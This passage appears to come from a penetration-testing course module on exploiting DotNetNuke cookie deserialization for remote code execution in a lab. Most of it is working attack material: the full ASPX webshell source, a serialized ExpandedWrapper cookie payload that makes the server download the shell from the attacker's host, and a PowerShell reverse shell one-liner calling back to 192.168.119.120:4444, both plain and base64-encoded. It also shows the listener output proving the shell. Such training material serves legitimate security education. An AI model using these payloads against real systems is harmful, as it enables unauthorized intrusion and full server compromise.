(Microsoft, 2020), [https://referencesource.microsoft.com/#System.Data.Services/System/Data/Services/Internal/ExpandedWrapper.cs](https://referencesource.microsoft.com/#System.Data.Services/System/Data/Services/Internal/ExpandedWrapper.cs) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_232-2)

3

(Microsoft, 2015), [https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/projection-operations](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/projection-operations) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_232-3)

4

(OakLeaf Systems, 2010), [http://oakleafblog.blogspot.com/2010/07/windows-azure-and-cloud-computing-posts_22.html](http://oakleafblog.blogspot.com/2010/07/windows-azure-and-cloud-computing-posts_22.html) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_232-4)

## 4.4. Putting It All Together

At this point we can set up the entire attack and try to gain a reverse shell using this vulnerability. In order to do that, we will use a ASPX command shell that can be found on our attacking Kali VM. We'll copy that into our webserver root directory and make sure we set the correct permissions on it.

```
kali@kali:~$ locate cmdasp.aspx
/usr/share/webshells/aspx/cmdasp.aspx

kali@kali:~$ cat /usr/share/webshells/aspx/cmdasp.aspx
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>

<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->

kali@kali:~$ sudo cp /usr/share/webshells/aspx/cmdasp.aspx /var/www/html/

kali@kali:~$ sudo chmod 644 /var/www/html/cmdasp.aspx
```

> Listing 24 - Setting up our attacking webserver

We'll use our application to serialize the _ExpandedWrapper_ object again, making sure that we modify the URL and the file name we use in the _MethodName_ parameters. As a result, we should see a serialized object similar to the following:

```
<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.119.120/cmdasp.aspx</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```

> Listing 25 - A payload that will upload an ASPX command shell to the DNN server from our Kali VM

Please keep in mind that the reason we can write to the DNN root directory is due to the permissions we had to give to the IIS account, per DNN installation instructions:

the website user account must have Read, Write, and Change Control of the root website directory and subdirectories ( this allows the application to create files/folders and update its config files)

We can now modify a HTTP request as we did earlier in this module and send it to our target. This time however we will use our serialized object as the DNNPersonalization cookie value.

![Figure 43: Sending our final payload to the DNN webserver](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/bbe263a5b32921306b5db0d744cfe791-Picture35.png)

Figure 43: Sending our final payload to the DNN webserver

Everything should have worked as expected at this point and our malicious payload should have executed as expected. We can confirm that by looking at the webserver log file, which indicates that our ASPX shell has been downloaded.

```
192.168.121.120 - - [07/Sep/2018:13:31:13 -0700] "GET /cmdasp.aspx HTTP/1.1" 200 1662 "-" "-"
```

> Listing 26 - Our malicious ASPX shell has been downloaded by the DNN web application

Finally, we can validate our attack success by browsing to our newly uploaded webshell.

![Figure 44: Our ASPX command shell can be accessed on the DNN webserver](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/a8d8a85ac9b2f936553ad996b9749af5-Picture36.png)

Figure 44: Our ASPX command shell can be accessed on the DNN webserver

At this point, we can execute any command of our choosing. In order to wrap up our attack we will execute a PowerShell reverse shell command[1](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_233-1) and make sure we receive that shell on our Kali VM.

The following listing shows the Powershell reverse shell one-liner command we will use:

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.120',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
```

> Listing 27 - Plaintext version of the Powershell one-liner we will use for our reverse shell.

To avoid any possible quotation and encoding issues while passing the above complex command to the webshell, we are going to encode it to _base64_ format, since the PowerShell executable accepts the _–EncodedCommand_ parameter, which instructs the interpreter to _base64-decode_ the command before executing it. Please also note that PowerShell uses the Little Endian _UTF-16_ encoding version, which is reflected in the iconv command in the following listing.

```
kali@kali:~$ cat powershellcmd.txt 
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.120',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};

kali@kali:~$ iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBO
AGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYA
OAAuADIALgAyADMAOAAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABp
AGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQA
ZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAg
AD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIA
eQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9
ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUA
bQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBp
AG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0A
IAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBn
ACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsA
IAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABz
AGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoA
QQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAk
AHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUA
bgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAo
ACkAfQA7AAoA
```

> Listing 28 - The command used to encode our reverse shell

The final command we will execute from the webshell then looks like the following:

```
powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADIALgAyADMAOAAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7AAoA
```

> Listing 29 - PowerShell reverse shell we will execute in our ASPX command shell

Finally, our exploit is complete and we successfully receive our reverse shell.

```
kali@kali:~$ nc -lvp 4444
[sudo] password for kali: 
listening on [any] 4444 ...
connect to [192.168.119.120] from WIN-2TU088Q2N5H.localdomain [192.168.121.120] 54654
whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> exit
kali@kali:~$ 
```

> Listing 30 - Our exploit has worked and we have received a shell

#### Exercise

1. Repeat the attack described in the previous section and obtain a reverse shell
    
2. The original Muñoz and Mirosh presentation includes a reference to the DNN _WriteFile_ function, which can be used to disclose information from the vulnerable DNN server. Generate an XML payload that will achieve that goal.
    

#### ysoserial.net

Now that we have manually analyzed and exploited this vulnerability, and have gained a thorough understanding of the _ObjectDataProvider_ gadget mechanics, we need to mention a tool that can automate many of these tasks for us. Using the original _ysoserial_ Java payload generator[2](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_233-2) as inspiration, researcher Alvaro Muñoz also created the _ysoserial.net_[3](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_233-3) payload generator that, as the name implies, specifically targets unsafe object deserialization in .Net applications.

In addition to the gadget we used in this module, _ysoserial.net_ includes additional gadgets that can be useful to an attacker if certain conditions are present in a vulnerable application. We strongly encourage you to inspect the payloads it offers as well as the inner workings of this tool, as it will enhance your knowledge and allow you to possibly exploit a variety of different .Net deserialization vulnerabilities.

#### Extra Mile

Although we have not discussed Java deserialization vulnerabilities in this course, it is worth mentioning that one such vulnerability exists in the ManageEngine Applications Manager instance in your lab. We encourage you to get familiar with the Java _ysoserial_ version and try to identify and exploit this vulnerability.

1

(Nikhil Mittal, 2018), [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_233-1)

2

(Chris Frohoff, 2019), [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_233-2)

3

(Alvaro Muñoz, 2020), [https://github.com/pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_233-3)

## 4.5. Wrapping Up

In this module we analyzed a vulnerability in the DNN platform that clearly demonstrates that .NET applications can suffer from deserialization issues similar to any other language. Although deserialization vulnerabilities are arguably found more often in PHP and Java applications, we encourage you not to neglect this class of vulnerabilities when facing .NET applications, as they can prove to have a critical impact.